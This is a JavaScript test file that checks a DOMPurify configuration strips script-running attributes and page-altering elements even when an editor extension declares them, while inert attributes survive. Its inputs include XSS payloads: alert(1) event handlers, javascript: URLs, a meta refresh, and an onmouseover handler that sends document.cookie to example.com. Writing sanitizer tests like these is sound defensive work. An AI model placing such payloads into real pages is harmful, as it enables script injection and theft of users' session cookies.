import { describe, expect, test } from "vitest"
import { DOMPurify, buildConfig } from "src/config/dom_purify"

function sanitizeWith(allowedElements, html) {
  return DOMPurify.sanitize(html, buildConfig(allowedElements))
}

// An extension's allowedElements admits attributes by name. These are the ones it
// must never be able to admit, because they run script whatever their value.
describe("dom_purify — attributes extensions can't allow", () => {
  test("drops event handlers an extension declares", () => {
    for (const [ attribute, value ] of [
      [ "onclick", "alert(1)" ],
      [ "onmouseover", "fetch(`//example.com/${document.cookie}`)" ],
      [ "onfocus", "alert(1)" ],
      [ "ONLOAD", "alert(1)" ]
    ]) {
      const out = sanitizeWith(
        [ { tag: "p", attributes: [ attribute ] } ],
        `<p ${attribute}="${value}">hi</p>`
      )

      expect(out).toBe("<p>hi</p>")
    }
  })

  test("drops srcdoc an extension declares", () => {
    const out = sanitizeWith(
      [ { tag: "iframe", attributes: [ "src", "srcdoc" ] } ],
      '<iframe src="https://example.com/embed" srcdoc="<script>alert(1)</script>"></iframe>'
    )

    expect(out).toBe('<iframe src="https://example.com/embed"></iframe>')
  })

  test("drops patchsrc, and for outside a label or an output", () => {
    const out = sanitizeWith(
      [ { tag: "div", attributes: [ "patchsrc", "for" ] }, { tag: "template", attributes: [ "for" ] }, { tag: "label", attributes: [ "for" ] } ],
      '<div patchsrc="https://example.com/x.html" for="t">a</div><template for="t"></template><label for="name">b</label>'
    )

    expect(out).toBe('<div>a</div><template></template><label for="name">b</label>')
  })

  test("drops elements that act on the page, even when declared", () => {
    const out = sanitizeWith(
      [ "p", "script", "style", "link", "meta", { tag: "base", attributes: [ "href" ] } ],
      '<p>x</p><script>alert(1)</script><style>body { display: none }</style>' +
        '<link rel="stylesheet" href="https://example.com/x.css"><meta http-equiv="refresh" content="0;url=https://example.com">' +
        '<base href="https://example.com/">'
    )

    expect(out).toBe("<p>x</p>")
  })

  test("drops them in the fallback sanitizer too, which has no allowlist", () => {
    const out = DOMPurify.sanitize('<div>a<style>* { display: none }</style></div>', buildConfig())

    expect(out).toBe("<div>a</div>")
  })

  test("keeps URL-bearing attributes subject to the URI check", () => {
    const allowed = [
      { tag: "a", attributes: [ "ping" ] },
      { tag: "img", attributes: [ "srcset" ] },
      { tag: "button", attributes: [ "formaction" ] }
    ]

    expect(sanitizeWith(allowed, '<a href="javascript:alert(1)" ping="javascript:alert(1)">x</a>')).toBe("<a>x</a>")
    expect(sanitizeWith(allowed, '<img src="a.png" srcset="javascript:alert(1) 2x">')).toBe('<img src="a.png">')
    expect(sanitizeWith(allowed, '<button formaction="javascript:alert(1)">x</button>')).toBe("<button>x</button>")
    expect(sanitizeWith(allowed, '<a href="https://example.com" ping="https://example.com/ping">x</a>'))
      .toBe('<a href="https://example.com" ping="https://example.com/ping">x</a>')
  })

  test("keeps the inert attributes an extension declares", () => {
    const out = sanitizeWith(
      [ { tag: "ol", attributes: [ "start" ] }, { tag: "p", attributes: [ "data-id", "aria-label", "lang" ] }, "li" ],
      '<ol start="3"><li>x</li></ol><p data-id="1" aria-label="note" lang="en">y</p>'
    )

    expect(out).toBe('<ol start="3"><li>x</li></ol><p data-id="1" aria-label="note" lang="en">y</p>')
  })
})
